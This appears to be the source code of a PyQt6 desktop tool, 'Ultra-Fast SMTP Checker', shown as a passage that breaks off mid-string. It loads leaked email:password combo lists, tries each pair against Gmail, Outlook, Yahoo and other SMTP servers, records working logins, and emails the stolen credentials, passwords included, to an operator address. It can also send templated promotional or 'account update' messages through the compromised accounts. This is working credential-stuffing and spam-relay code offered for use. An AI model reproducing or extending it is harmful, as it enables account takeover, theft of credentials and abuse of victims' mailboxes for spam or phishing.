import sys
import os
import smtplib
import socket
import threading
import queue
import re
import time
import mmap
import gc
import json
import webbrowser
import tempfile
from collections import defaultdict, deque
from concurrent.futures import ThreadPoolExecutor, as_completed
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, 
                            QHBoxLayout, QLabel, QLineEdit, QPushButton, 
                            QTextEdit, QFileDialog, QProgressBar, QSpinBox,
                            QTableWidget, QTableWidgetItem, QHeaderView, QMenu,
                            QTabWidget, QDialog, QDialogButtonBox, QMessageBox,
                            QRadioButton, QButtonGroup, QComboBox, QCheckBox,
                            QGroupBox, QGridLayout, QSplitter, QFrame, QScrollArea)
from PyQt6.QtCore import Qt, pyqtSignal, QObject, QThread, QTimer, QSize
from PyQt6.QtGui import QColor, QCursor, QFont, QPixmap, QPainter, QBrush
import socket
import dns.resolver
import asyncio
import aiofiles

class UltraCache:
    """Ultra-fast caching system with TTL and size limits"""
    def __init__(self, max_size=10000, ttl=300):
        self.cache = {}
        self.access_times = {}
        self.max_size = max_size
        self.ttl = ttl
        self.lock = threading.RLock()
    
    def get(self, key):
        with self.lock:
            if key in self.cache:
                entry_time = self.access_times.get(key, 0)
                if time.time() - entry_time < self.ttl:
                    self.access_times[key] = time.time()
                    return self.cache[key]
                else:
                    # Expired
                    del self.cache[key]
                    del self.access_times[key]
            return None
    
    def set(self, key, value):
        with self.lock:
            if len(self.cache) >= self.max_size:
                # Remove oldest entries
                oldest_key = min(self.access_times.keys(), key=lambda k: self.access_times[k])
                del self.cache[oldest_key]
                del self.access_times[oldest_key]
            
            self.cache[key] = value
            self.access_times[key] = time.time()
    
    def clear_expired(self):
        with self.lock:
            current_time = time.time()
            expired_keys = [k for k, t in self.access_times.items() if current_time - t > self.ttl]
            for key in expired_keys:
                del self.cache[key]
                del self.access_times[key]

class DNSCache:
    """Aggressive DNS caching with fallback mechanisms"""
    def __init__(self):
        self.cache = UltraCache(max_size=5000, ttl=600)  # 10 min TTL
        self.failed_domains = set()
        self.lock = threading.RLock()
    
    def resolve_smtp_hosts(self, domain):
        cached = self.cache.get(domain)
        if cached:
            return cached
        
        if domain in self.failed_domains:
            return []
        
        hosts = []
        try:
            # Priority order for different providers
            if 'gmail' in domain.lower():
                hosts = ['smtp.gmail.com']
            elif any(x in domain.lower() for x in ['outlook', 'hotmail', 'live', 'msn']):
                hosts = ['smtp-mail.outlook.com', 'smtp.live.com', 'smtp.office365.com']
            elif 'yahoo' in domain.lower():
                hosts = ['smtp.mail.yahoo.com', 'plus.smtp.mail.yahoo.com']
            elif 'icloud' in domain.lower():
                hosts = ['smtp.mail.me.com']
            elif 'aol' in domain.lower():
                hosts = ['smtp.aol.com']
            else:
                # Generic attempts
                hosts = [
                    f"smtp.{domain}",
                    f"mail.{domain}",
                    f"smtpout.{domain}",
                    f"outgoing.{domain}",
                    f"send.{domain}",
                    domain
                ]
            
            # Validate hosts exist
            validated_hosts = []
            for host in hosts:
                try:
                    socket.gethostbyname(host)
                    validated_hosts.append(host)
                except:
                    continue
            
            if validated_hosts:
                self.cache.set(domain, validated_hosts)
                return validated_hosts
            else:
                self.failed_domains.add(domain)
                return []
                
        except Exception:
            self.failed_domains.add(domain)
            return []

class ConnectionPool:
    """Connection pooling for SMTP connections"""
    def __init__(self, max_size=50):
        self.pool = queue.Queue(maxsize=max_size)
        self.active_connections = {}
        self.lock = threading.RLock()
        self.max_size = max_size
    
    def get_connection(self, host, port):
        key = f"{host}:{port}"
        
        try:
            connection = self.pool.get_nowait()
            if connection and connection.get('key') == key:
                # Validate connection
                try:
                    connection['server'].noop()
                    return connection['server']
                except:
                    pass
        except queue.Empty:
            pass
        
        return None
    
    def return_connection(self, host, port, server):
        if self.pool.qsize() < self.max_size:
            try:
                self.pool.put_nowait({
                    'key': f"{host}:{port}",
                    'server': server,
                    'timestamp': time.time()
                })
            except queue.Full:
                try:
                    server.quit()
                except:
                    pass

class LargeFileHandler:
    """Memory-mapped file handler for large combo files"""
    def __init__(self, filename, chunk_size=1024*1024):  # 1MB chunks
        self.filename = filename
        self.chunk_size = chunk_size
        self.file_size = os.path.getsize(filename)
        self.total_lines = 0
        self.valid_combos = 0
        self._count_lines()
    
    def _count_lines(self):
        """Count total lines efficiently"""
        try:
            with open(self.filename, 'rb') as f:
                self.total_lines = sum(1 for _ in f)
        except:
            self.total_lines = 0
    
    def load_combos_generator(self, progress_callback=None):
        """Generator that yields validated combos without loading all into memory"""
        try:
            if self.file_size > 50 * 1024 * 1024:  # > 50MB, use mmap
                with open(self.filename, 'rb') as f:
                    with mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ) as mm:
                        lines_processed = 0
                        line_start = 0
                        
                        for i in range(len(mm)):
                            if mm[i] == ord('\n') or i == len(mm) - 1:
                                line = mm[line_start:i].decode('utf-8', errors='ignore').strip()
                                line_start = i + 1
                                lines_processed += 1
                                
                                if self._validate_combo(line):
                                    self.valid_combos += 1
                                    yield line
                                
                                if progress_callback and lines_processed % 1000 == 0:
                                    progress_callback(lines_processed, self.total_lines)
            else:
                # Regular file reading for smaller files
                with open(self.filename, 'r', encoding='utf-8', errors='ignore') as f:
                    lines_processed = 0
                    for line in f:
                        line = line.strip()
                        lines_processed += 1
                        
                        if self._validate_combo(line):
                            self.valid_combos += 1
                            yield line
                        
                        if progress_callback and lines_processed % 1000 == 0:
                            progress_callback(lines_processed, self.total_lines)
                            
        except Exception as e:
            print(f"Error loading combos: {e}")
    
    def _validate_combo(self, line):
        """Ultra-fast combo validation"""
        if not line or len(line) < 6:
            return False
        
        colon_pos = line.find(':')
        if colon_pos == -1 or colon_pos == 0 or colon_pos == len(line) - 1:
            return False
        
        email_part = line[:colon_pos]
        at_pos = email_part.find('@')
        if at_pos == -1 or at_pos == 0 or at_pos == len(email_part) - 1:
            return False
        
        domain_part = email_part[at_pos + 1:]
        if '.' not in domain_part or len(domain_part) < 3:
            return False
        
        return True

class AsyncResultWriter:
    """Asynchronous result writer to avoid I/O blocking"""
    def __init__(self, filename='validsend.txt'):
        self.filename = filename
        self.write_queue = queue.Queue()
        self.writer_thread = None
        self.running = False
        self.lock = threading.Lock()
    
    def start(self):
        with self.lock:
            if not self.running:
                self.running = True
                self.writer_thread = threading.Thread(target=self._write_worker, daemon=True)
                self.writer_thread.start()
    
    def stop(self):
        with self.lock:
            self.running = False
            self.write_queue.put(None)  # Signal to stop
    
    def write_async(self, data):
        if self.running:
            self.write_queue.put(data)
    
    def _write_worker(self):
        """Background worker for writing results"""
        buffer = []
        last_write = time.time()
        
        while self.running:
            try:
                item = self.write_queue.get(timeout=1.0)
                if item is None:  # Stop signal
                    break
                
                buffer.append(item)
                
                # Write in batches or every 5 seconds
                if len(buffer) >= 10 or time.time() - last_write > 5:
                    self._flush_buffer(buffer)
                    buffer = []
                    last_write = time.time()
                    
            except queue.Empty:
                # Flush remaining buffer
                if buffer:
                    self._flush_buffer(buffer)
                    buffer = []
                    last_write = time.time()
        
        # Final flush
        if buffer:
            self._flush_buffer(buffer)
    
    def _flush_buffer(self, buffer):
        """Flush buffer to file"""
        try:
            with open(self.filename, 'a', encoding='utf-8') as f:
                for item in buffer:
                    f.write(f"{item}\n")
        except Exception as e:
            print(f"Error writing to file: {e}")

class WorkerSignals(QObject):
    progress = pyqtSignal(int)
    log = pyqtSignal(str)
    valid_smtp = pyqtSignal(str, str, dict)  # Added stats dict
    finished = pyqtSignal()
    stats_update = pyqtSignal(dict)

class RealTimeStats:
    """Real-time statistics tracking"""
    def __init__(self):
        self.lock = threading.RLock()
        self.reset()
    
    def reset(self):
        with self.lock:
            self.start_time = time.time()
            self.processed = 0
            self.valid_found = 0
            self.rate_limits = 0
            self.size_limits = 0
            self.unknown_limits = 0
            self.ports_found = defaultdict(int)
            self.providers_found = defaultdict(int)
            self.speed_history = deque(maxlen=30)  # Last 30 measurements
            self.last_speed_calc = time.time()
            self.last_processed = 0
    
    def update(self, processed_delta=0, valid_delta=0, port=None, domain=None, limit_type=None):
        with self.lock:
            self.processed += processed_delta
            self.valid_found += valid_delta
            
            if port:
                self.ports_found[port] += 1
            
            if domain:
                # Extract provider from domain
                provider = self._extract_provider(domain)
                self.providers_found[provider] += 1
            
            if limit_type:
                if limit_type == "rate":
                    self.rate_limits += 1
                elif limit_type == "size":
                    self.size_limits += 1
                else:
                    self.unknown_limits += 1
            
            # Calculate speed
            current_time = time.time()
            if current_time - self.last_speed_calc >= 1.0:  # Update every second
                speed = (self.processed - self.last_processed) / (current_time - self.last_speed_calc)
                self.speed_history.append(speed)
                self.last_speed_calc = current_time
                self.last_processed = self.processed
    
    def _extract_provider(self, domain):
        domain_lower = domain.lower()
        if 'gmail' in domain_lower:
            return 'Gmail'
        elif any(x in domain_lower for x in ['outlook', 'hotmail', 'live']):
            return 'Outlook'
        elif 'yahoo' in domain_lower:
            return 'Yahoo'
        elif 'icloud' in domain_lower:
            return 'iCloud'
        else:
            return 'Other'
    
    def get_stats(self):
        with self.lock:
            elapsed = time.time() - self.start_time
            avg_speed = self.processed / elapsed if elapsed > 0 else 0
            current_speed = sum(self.speed_history) / len(self.speed_history) if self.speed_history else 0
            
            return {
                'processed': self.processed,
                'valid_found': self.valid_found,
                'elapsed': elapsed,
                'avg_speed': avg_speed,
                'current_speed': current_speed,
                'rate_limits': self.rate_limits,
                'size_limits': self.size_limits,
                'unknown_limits': self.unknown_limits,
                'ports_found': dict(self.ports_found),
                'providers_found': dict(self.providers_found),
                'success_rate': (self.valid_found / self.processed * 100) if self.processed > 0 else 0
            }

class SortableTableWidget(QTableWidget):
    def __init__(self, rows, columns):
        super().__init__(rows, columns)
        self.horizontalHeader().sectionClicked.connect(self.on_header_clicked)
        
    def on_header_clicked(self, logical_index):
        """Handle header click for custom sorting"""
        column_name = self.horizontalHeaderItem(logical_index).text()
        
        if column_name == "Type":
            self.show_type_sort_menu(logical_index)
        elif column_name == "Limit":
            self.show_limit_sort_menu(logical_index)
        elif column_name == "Port":
            self.show_port_sort_menu(logical_index)
        elif column_name == "Provider":
            self.show_provider_sort_menu(logical_index)
        else:
            # Default sorting for other columns
            self.sortItems(logical_index, Qt.SortOrder.AscendingOrder)
    
    def show_type_sort_menu(self, column_index):
        """Enhanced type sorting menu"""
        menu = QMenu(self)
        
        rate_limit_action = menu.addAction("⚡ Rate Limit First")
        size_limit_action = menu.addAction("📦 Size Limit First")
        unknown_action = menu.addAction("❓ Unknown First")
        high_limit_action = menu.addAction("🔥 High Limits First")
        
        action = menu.exec(QCursor.pos())
        
        if action == rate_limit_action:
            self.sort_by_type("⚡ Rate Limit")
        elif action == size_limit_action:
            self.sort_by_type("📦 Size Limit")
        elif action == unknown_action:
            self.sort_by_type("❓ Unknown")
        elif action == high_limit_action:
            self.sort_by_limit_value(descending=True)
    
    def show_limit_sort_menu(self, column_index):
        """Enhanced limit sorting menu"""
        menu = QMenu(self)
        
        high_to_low_action = menu.addAction("📈 High to Low")
        low_to_high_action = menu.addAction("📉 Low to High")
        by_type_action = menu.addAction("🔄 Group by Type")
        unlimited_first_action = menu.addAction("∞ Unlimited First")
        
        action = menu.exec(QCursor.pos())
        
        if action == high_to_low_action:
            self.sort_by_limit_value(descending=True)
        elif action == low_to_high_action:
            self.sort_by_limit_value(descending=False)
        elif action == by_type_action:
            self.sort_by_limit_type()
        elif action == unlimited_first_action:
            self.sort_by_unlimited_first()
    
    def show_port_sort_menu(self, column_index):
        """Enhanced port sorting menu"""
        menu = QMenu(self)
        
        ascending_action = menu.addAction("🔢 Low to High")
        descending_action = menu.addAction("🔢 High to Low")
        by_common_action = menu.addAction("⭐ Common Ports First")
        by_secure_action = menu.addAction("🔒 Secure Ports First")
        
        action = menu.exec(QCursor.pos())
        
        if action == ascending_action:
            self.sortItems(column_index, Qt.SortOrder.AscendingOrder)
        elif action == descending_action:
            self.sortItems(column_index, Qt.SortOrder.DescendingOrder)
        elif action == by_common_action:
            self.sort_by_common_ports()
        elif action == by_secure_action:
            self.sort_by_secure_ports()
    
    def show_provider_sort_menu(self, column_index):
        """Provider sorting menu"""
        menu = QMenu(self)
        
        gmail_first_action = menu.addAction("📧 Gmail First")
        outlook_first_action = menu.addAction("📨 Outlook First")
        popular_first_action = menu.addAction("⭐ Popular First")
        alphabetical_action = menu.addAction("🔤 Alphabetical")
        
        action = menu.exec(QCursor.pos())
        
        if action == gmail_first_action:
            self.sort_by_provider("Gmail")
        elif action == outlook_first_action:
            self.sort_by_provider("Outlook")
        elif action == popular_first_action:
            self.sort_by_provider_popularity()
        elif action == alphabetical_action:
            self.sortItems(column_index, Qt.SortOrder.AscendingOrder)
    
    def sort_by_provider(self, priority_provider):
        """Sort by specific provider first"""
        rows_data = self._get_all_rows_data()
        
        def provider_sort_key(row):
            provider = row[6] if len(row) > 6 else ""  # Provider column
            if provider == priority_provider:
                return 0
            elif provider in ["Gmail", "Outlook", "Yahoo", "iCloud"]:
                return 1
            else:
                return 2
        
        rows_data.sort(key=provider_sort_key)
        self.populate_table_with_data(rows_data)
    
    def sort_by_provider_popularity(self):
        """Sort by provider popularity"""
        rows_data = self._get_all_rows_data()
        
        popularity_order = ["Gmail", "Outlook", "Yahoo", "iCloud", "Other"]
        
        def popularity_sort_key(row):
            provider = row[6] if len(row) > 6 else "Other"
            try:
                return popularity_order.index(provider)
            except ValueError:
                return len(popularity_order)
        
        rows_data.sort(key=popularity_sort_key)
        self.populate_table_with_data(rows_data)
    
    def sort_by_secure_ports(self):
        """Sort by secure ports (465, 587) first"""
        rows_data = self._get_all_rows_data()
        
        def secure_port_key(row):
            port = row[1]  # Port column
            if port in ['465', '587']:
                return 0  # Secure ports first
            elif port == '25':
                return 2  # Unencrypted last
            else:
                return 1  # Other ports in middle
        
        rows_data.sort(key=secure_port_key)
        self.populate_table_with_data(rows_data)
    
    def sort_by_unlimited_first(self):
        """Sort unlimited/high limits first"""
        rows_data = self._get_all_rows_data()
        
        def unlimited_sort_key(row):
            limit_text = row[4].lower()  # Limit column
            if 'unlimited' in limit_text or 'no limit' in limit_text:
                return 0
            # Extract numerical value for comparison
            numbers = re.findall(r'\d+', limit_text)
            if numbers:
                value = int(numbers[0])
                if 'mb' in limit_text and value >= 100:
                    return 1  # High size limits
                elif any(x in limit_text for x in ['/hour', '/day']) and value >= 1000:
                    return 1  # High rate limits
                else:
                    return 2
            return 3
        
        rows_data.sort(key=unlimited_sort_key)
        self.populate_table_with_data(rows_data)
    
    def _get_all_rows_data(self):
        """Get all table data"""
        rows_data = []
        for row in range(self.rowCount()):
            row_data = []
            for col in range(self.columnCount()):
                item = self.item(row, col)
                row_data.append(item.text() if item else "")
            rows_data.append(row_data)
        return rows_data
    
    # ... (keep existing sort methods and add the new ones)
    def sort_by_type(self, priority_type):
        """Sort table by Type column with priority"""
        rows_data = self._get_all_rows_data()
        
        def type_sort_key(row):
            type_text = row[5] if len(row) > 5 else ""  # Type column
            if type_text == priority_type:
                return 0
            elif "⚡ Rate Limit" in type_text:
                return 1
            elif "📦 Size Limit" in type_text:
                return 2
            else:
                return 3
        
        rows_data.sort(key=type_sort_key)
        self.populate_table_with_data(rows_data)
    
    def sort_by_limit_value(self, descending=True):
        """Sort by numerical value in limit"""
        rows_data = self._get_all_rows_data()
        
        def limit_value_key(row):
            limit_text = row[4] if len(row) > 4 else ""  # Limit column
            if 'unlimited' in limit_text.lower():
                return float('inf') if descending else 0
            
            numbers = re.findall(r'\d+', limit_text)
            if numbers:
                value = int(numbers[0])
                if 'MB' in limit_text:
                    return value * 1000000
                elif 'KB' in limit_text:
                    return value * 1000
                elif '/day' in limit_text:
                    return value * 24
                else:
                    return value
            return 0
        
        rows_data.sort(key=limit_value_key, reverse=descending)
        self.populate_table_with_data(rows_data)
    
    def sort_by_limit_type(self):
        """Sort by limit type"""
        rows_data = self._get_all_rows_data()
        
        def limit_type_key(row):
            limit_text = row[4] if len(row) > 4 else ""
            if any(x in limit_text for x in ['/hour', '/day', '/min']):
                return 0
            elif any(x in limit_text for x in ['MB', 'KB', 'B']):
                return 1
            else:
                return 2
        
        rows_data.sort(key=limit_type_key)
        self.populate_table_with_data(rows_data)
    
    def sort_by_common_ports(self):
        """Sort by common SMTP ports first"""
        rows_data = self._get_all_rows_data()
        
        common_ports = ['587', '465', '25', '2525']
        
        def port_priority_key(row):
            port = row[1] if len(row) > 1 else ""
            if port in common_ports:
                return common_ports.index(port)
            else:
                return len(common_ports) + int(port) if port.isdigit() else 9999
        
        rows_data.sort(key=port_priority_key)
        self.populate_table_with_data(rows_data)
    
    def populate_table_with_data(self, rows_data):
        """Repopulate table with sorted data"""
        self.setRowCount(0)
        
        for row_data in rows_data:
            row = self.rowCount()
            self.insertRow(row)
            
            # Determine row color based on type
            limit = row_data[4] if len(row_data) > 4 else ""
            if any(x in limit for x in ["/hour", "/day", "/min"]):
                row_color = QColor(144, 238, 144)  # Light green
            elif any(x in limit for x in ["MB", "KB", "B"]):
                row_color = QColor(255, 255, 224)  # Light yellow
            else:
                row_color = QColor(211, 211, 211)  # Light gray
            
            for col, text in enumerate(row_data):
                if col < self.columnCount():
                    item = QTableWidgetItem(text)
                    item.setBackground(row_color)
                    self.setItem(row, col, item)

class UltraFastSMTPWorker(QThread):
    def __init__(self, combo_generator, test_email, stats, worker_id, email_mode="credentials", template_data=None):
        super().__init__()
        self.combo_generator = combo_generator
        self.test_email = test_email
        self.stats = stats
        self.worker_id = worker_id
        self.signals = WorkerSignals()
        self.running = True
        self.email_mode = email_mode
        self.template_data = template_data
        
        # Ultra-fast caches
        self.dns_cache = DNSCache()
        self.connection_pool = ConnectionPool()
        self.failed_hosts = set()
        self.successful_configs = {}
        
        # Batch processing
        self.batch_size = 5
        self.processed_batch = 0
        
    def ultra_fast_port_scan(self, host, ports, timeout=0.5):
        """Ultra-optimized port scanning"""
        if host in self.failed_hosts:
            return []
        
        available_ports = []
        
        def check_port_ultra_fast(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                result = sock.connect_ex((host, port))
                sock.close()
                return port if result == 0 else None
            except:
                return None
        
        # Parallel port checking with thread pool
        try:
            with ThreadPoolExecutor(max_workers=min(len(ports), 4)) as executor:
                futures = {executor.submit(check_port_ultra_fast, port): port for port in ports}
                
                for future in as_completed(futures, timeout=timeout * 2):
                    try:
                        result = future.result(timeout=0.1)
                        if result:
                            available_ports.append(result)
                    except:
                        continue
        except:
            # Fallback
            for port in ports[:2]:  # Only check first 2 ports
                if check_port_ultra_fast(port):
                    available_ports.append(port)
        
        return available_ports

    def get_smtp_limits_ultra_fast(self, server, host):
        """Extract all rate and size limits from EHLO, prioritize rate, return as comma-separated string. Avoid illogical rate/size duplicates."""
        try:
            cache_key = f"{host}_limits"
            cached = getattr(self, '_limits_cache', {}).get(cache_key)
            if cached:
                return cached

            ehlo_response = ""
            if hasattr(server, 'ehlo_resp') and server.ehlo_resp:
                ehlo_response = server.ehlo_resp.decode('utf-8', errors='ignore').upper()

            import re
            found_limits = []
            used_numbers = set()
            # --- Find all rate limits (only reasonable values) ---
            rate_patterns = [
                (r'RATE[:\s]*(\d+)[/\s]*(HOUR|H|DAY|D)', 2),
                (r'LIMIT[:\s]*(\d+)[/\s]*(HOUR|H|DAY|D)', 2),
                (r'MESSAGES[:\s]*PER[:\s]*(HOUR|DAY)[:\s]*(\d+)', 2),
                (r'(\d+)[/\s]*(HOUR|H|DAY|D)', 2),
                (r'QUOTA[:\s]*(\d+)', 1)
            ]
            for pattern, group_count in rate_patterns:
                for match in re.finditer(pattern, ehlo_response, re.IGNORECASE):
                    groups = match.groups()
                    if group_count == 2 and len(groups) >= 2:
                        rate_value = groups[0] if groups[0].isdigit() else groups[1]
                        time_unit = groups[1] if groups[0].isdigit() else groups[0]
                        time_unit = time_unit.lower().replace('h', 'hour').replace('d', 'day')
                        try:
                            rate_int = int(rate_value)
                            # Only treat as rate if value is reasonable
                            if rate_int < 100000:
                                found_limits.append(f"{rate_int}/{time_unit}")
                                used_numbers.add(rate_int)
                        except:
                            continue
                    elif group_count == 1:
                        try:
                            rate_int = int(groups[0])
                            if rate_int < 100000:
                                found_limits.append(f"{rate_int}/hour")
                                used_numbers.add(rate_int)
                        except:
                            continue

            # --- Find all size limits (only if not already used as rate) ---
            size_patterns = [
                (r'SIZE[:\s]*(\d+)', 1),
                (r'(\d+)[/\s]*MB', 1)
            ]
            for pattern, group_count in size_patterns:
                for match in re.finditer(pattern, ehlo_response, re.IGNORECASE):
                    groups = match.groups()
                    if group_count == 1:
                        try:
                            value = int(groups[0])
                            if value in used_numbers:
                                continue  # Don't add as size if already used as rate
                            if 'MB' in match.group(0):
                                found_limits.append(f"{value}MB")
                            elif value > 1000000:
                                found_limits.append(f"{value//1000000}MB")
                            elif value > 1000:
                                found_limits.append(f"{value//1000}KB")
                            else:
                                found_limits.append(f"{value}B")
                        except:
                            continue

            # Remove duplicates, prioritize rate limits first
            rate_limits = [l for l in found_limits if any(x in l for x in ['/hour', '/day'])]
            size_limits = [l for l in found_limits if any(x in l for x in ['MB', 'KB', 'B'])]
            all_limits = rate_limits + size_limits
            result = ', '.join(dict.fromkeys(all_limits)) if all_limits else "Unknown"

            if not hasattr(self, '_limits_cache'):
                self._limits_cache = {}
            self._limits_cache[cache_key] = result
            return result
        except Exception:
            return "Unknown"

    def lightning_smtp_test(self, email, password):
        """Lightning-fast SMTP testing with all optimizations"""
        domain = email.split('@')[1].lower()
        
        # Skip known bad domains
        bad_domains = {'example.com', 'test.com', 'invalid.com', 'fake.com', 'domain.com', 'mail.com'}
        if domain in bad_domains:
            return False, None, None, None, None
        
        # Check if we already tested this configuration
        config_key = f"{email}:{password}"
        if config_key in self.successful_configs:
            return True, *self.successful_configs[config_key]
        
        hosts = self.dns_cache.resolve_smtp_hosts(domain)
        if not hosts:
            return False, None, None, None, None
        
        # Prioritized ports with SSL preference
        ports = [587, 465, 25, 2525]
        
        for host in hosts:
            if not self.running:
                return False, None, None, None, None
            
            # Ultra-fast port scan
            available_ports = self.ultra_fast_port_scan(host, ports, timeout=0.3)
            
            if not available_ports:
                self.failed_hosts.add(host)
                continue
            
            # Try authentication on available ports
            port_priority = [587, 465, 25, 2525]
            sorted_ports = sorted(available_ports, key=lambda x: port_priority.index(x) if x in port_priority else 999)
            
            for port in sorted_ports:
                server = None
                try:
                    # Check connection pool first
                    server = self.connection_pool.get_connection(host, port)
                    
                    if not server:
                        # Create new connection with optimized settings
                        if port == 465:
                            server = smtplib.SMTP_SSL(host, port, timeout=3)
                        else:
                            server = smtplib.SMTP(host, port, timeout=3)
                            if port in [587, 25, 2525]:
                                try:
                                    if server.has_extn('STARTTLS'):
                                        server.starttls()
                                        server.ehlo()
                                except:
                                    pass
                    
                    if not hasattr(server, 'ehlo_resp') or not server.ehlo_resp:
                        server.ehlo()
                    
                    # Quick limit check
                    limit = self.get_smtp_limits_ultra_fast(server, host)
                    
                    # Fast authentication test
                    server.login(email, password)
                    
                    # Determine provider
                    provider = self._get_provider(domain)
                    
                    # Send test email based on mode
                    if self.email_mode == "template" and self.template_data:
                        self._send_template_email(server, email)
                    else:
                        self._send_credentials_email(server, email, password, host, port, limit)
                    
                    # Return connection to pool
                    self.connection_pool.return_connection(host, port, server)
                    
                    # Cache successful configuration
                    result = (host, port, limit, provider)
                    self.successful_configs[config_key] = result
                    
                    return True, *result
                    
                except smtplib.SMTPAuthenticationError:
                    try:
                        if server:
                            server.quit()
                    except:
                        pass
                    break  # Invalid credentials
                    
                except Exception:
                    try:
                        if server:
                            server.quit()
                    except:
                        pass
                    continue
        
        return False, None, None, None, None
    
    def _get_provider(self, domain):
        """Extract provider from domain"""
        domain_lower = domain.lower()
        if 'gmail' in domain_lower:
            return 'Gmail'
        elif any(x in domain_lower for x in ['outlook', 'hotmail', 'live']):
            return 'Outlook'
        elif 'yahoo' in domain_lower:
            return 'Yahoo'
        elif 'icloud' in domain_lower:
            return 'iCloud'
        else:
            return 'Other'
    
    def _send_template_email(self, server, from_email):
        """Send email using custom template"""
        try:
            msg = MIMEMultipart('alternative')
            msg['From'] = from_email
            msg['To'] = self.test_email
            msg['Subject'] = self.template_data.get("subject", "Test Email")
            
            # Add plain text part
            if self.template_data.get("plain_text"):
                plain_part = MIMEText(self.template_data["plain_text"], 'plain')
                msg.attach(plain_part)
            
            # Add HTML part if enabled
            if self.template_data.get("use_html") and self.template_data.get("html"):
                html_part = MIMEText(self.template_data["html"], 'html')
                msg.attach(html_part)
            
            server.send_message(msg)
        except:
            pass  # Email sending is secondary to credential validation
    
    def _send_credentials_email(self, server, email, password, host, port, limit):
        """Send email with SMTP credentials"""
        try:
            msg = MIMEMultipart()
            msg['From'] = email
            msg['To'] = self.test_email
            msg['Subject'] = "SMTP Credentials Validation - Success"
            
            body = f"""
✅ SMTP Server Test Successful!

🔧 SMTP Configuration:
• Host: {host}
• Port: {port}
• Email: {email}
• Password: {password}
• Limit: {limit}

📊 Server Capabilities:
This SMTP server is verified and ready for use.

⚡ Tested by Ultra-Fast SMTP Checker v2.0
            """
            
            msg.attach(MIMEText(body, 'plain'))
            server.send_message(msg)
        except:
            pass

    def run(self):
        """Optimized worker execution with batch processing"""
        processed = 0
        
        try:
            for combo in self.combo_generator:
                if not self.running:
                    break
                
                if ':' not in combo or '@' not in combo:
                    processed += 1
                    continue
                
                try:
                    email, password = combo.split(':', 1)
                    
                    # Lightning-fast SMTP test
                    success, host, port, limit, provider = self.lightning_smtp_test(email, password)
                    
                    if success:
                        # Determine limit type
                        limit_type = "unknown"
                        if any(x in limit.lower() for x in ["/hour", "/day", "/min"]):
                            limit_type = "rate"
                        elif any(x in limit.lower() for x in ["mb", "kb", "b"]):
                            limit_type = "size"
                        
                        # Update stats
                        self.stats.update(
                            processed_delta=1,
                            valid_delta=1,
                            port=port,
                            domain=email.split('@')[1],
                            limit_type=limit_type
                        )
                        
                        # Create display info
                        smtp_info = f"{host}|{port}|{email}|{password}|{limit}|{provider}"
                        
                        # Emit signals
                        self.signals.valid_smtp.emit(
                            smtp_info, 
                            limit, 
                            {
                                'provider': provider,
                                'port': port,
                                'limit_type': limit_type
                            }
                        )
                        
                        self.signals.log.emit(f"[W{self.worker_id}] ✅ {email} -> {host}:{port} ({limit})")
                        
                        # Write to file asynchronously
                        file_info = f"{host}|{port}|{email}|{password}"
                        AsyncResultWriter().write_async(file_info)
                    else:
                        self.stats.update(processed_delta=1)
                        
                        # Log failed attempts occasionally
                        if processed % 200 == 0:
                            self.signals.log.emit(f"[W{self.worker_id}] ❌ Batch processed: {processed}")
                    
                    processed += 1
                    self.processed_batch += 1
                    
                    # Emit progress in batches
                    if self.processed_batch >= self.batch_size:
                        self.signals.progress.emit(self.processed_batch)
                        self.processed_batch = 0
                    
                    # Memory cleanup every 100 processed
                    if processed % 100 == 0:
                        gc.collect()
                        # Clear DNS cache of expired entries
                        self.dns_cache.cache.clear_expired()
                        
                except Exception as e:
                    self.signals.log.emit(f"[W{self.worker_id}] Error processing {combo}: {str(e)}")
                    processed += 1
                    continue
        
        except Exception as e:
            self.signals.log.emit(f"[W{self.worker_id}] Worker error: {str(e)}")
        
        # Emit remaining progress
        if self.processed_batch > 0:
            self.signals.progress.emit(self.processed_batch)
        
        self.signals.finished.emit()

    def stop(self):
        self.running = False

class EmailTemplateDialog(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("📧 Advanced Email Template Editor")
        self.setMinimumSize(800, 600)
        self.setModal(True)
        
        layout = QVBoxLayout(self)
        
        # Header
        header = QLabel("✨ Create Professional Email Templates")
        header.setStyleSheet("font-size: 16px; font-weight: bold; color: #2c3e50; padding: 10px;")
        layout.addWidget(header)
        
        # Subject input with enhanced styling
        subject_group = QGroupBox("📋 Email Subject")
        subject_layout = QVBoxLayout(subject_group)
        
        self.subject_input = QLineEdit()
        self.subject_input.setPlaceholderText("Enter a compelling email subject...")
        self.subject_input.setStyleSheet("padding: 8px; font-size: 12px;")
        subject_layout.addWidget(self.subject_input)
        
        # Subject suggestions
        suggestions_layout = QHBoxLayout()
        suggestions_label = QLabel("💡 Quick suggestions:")
        suggestions_layout.addWidget(suggestions_label)
        
        suggestion_buttons = [
            ("🎉 Special Offer", "Special Offer Just For You!"),
            ("📰 Newsletter", "Your Weekly Newsletter"),
            ("🔔 Update", "Important Account Update"),
            ("🎁 Promotion", "Exclusive Promotion Inside")
        ]
        
        for text, subject in suggestion_buttons:
            btn = QPushButton(text)
            btn.clicked.connect(lambda checked, s=subject: self.subject_input.setText(s))
            btn.setStyleSheet("padding: 4px; font-size: 10px;")
            suggestions_layout.addWidget(btn)
        
        subject_layout.addLayout(suggestions_layout)
        layout.addWidget(subject_group)
        
        # Enhanced editor tabs
        self.tabs = QTabWidget()
        self.tabs.setStyleSheet("QTabWidget::pane { border: 1px solid #bdc3c7; }")
        
        # Plain text editor with features
        plain_group = QWidget()
        plain_layout = QVBoxLayout(plain_group)
        
        plain_toolbar = QHBoxLayout()
        plain_toolbar.addWidget(QLabel("📝 Plain Text Content:"))
        
        # Plain text tools
        plain_tools = [
            ("📁 Load File", self.load_plain_text),
            ("💾 Save", self.save_plain_text),
            ("🔤 Insert Vars", self.insert_variables_plain)
        ]
        
        for text, func in plain_tools:
            btn = QPushButton(text)
            btn.clicked.connect(func)
            btn.setStyleSheet("padding: 4px; font-size: 10px;")
            plain_toolbar.addWidget(btn)
        
        plain_layout.addLayout(plain_toolbar)
        
        self.plain_editor = QTextEdit()
        self.plain_editor.setPlaceholderText("""Write your plain text email content here...

You can use variables like:
{name} - Recipient name
